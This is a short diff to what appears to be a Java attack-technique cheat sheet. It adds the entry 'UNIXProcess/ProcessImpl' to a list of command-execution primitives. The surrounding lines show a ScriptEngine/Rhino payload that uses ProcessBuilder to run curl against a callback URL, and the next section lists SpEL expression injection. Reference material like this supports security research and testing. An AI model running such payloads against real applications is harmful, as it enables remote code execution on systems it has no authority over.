@@ -297,6 +297,7 @@ if (engine == null)
     engine = factory.getEngineByName("Rhino JavaScript");  // ServiceMix
 engine.eval("var x=new java.lang.ProcessBuilder; x.command(\"curl\",\"http://127.0.0.1:8000/cmd\"); x.start()");
 ```
+- UNIXProcess/ProcessImpl
 
 ### Expression Language
 - SPEL
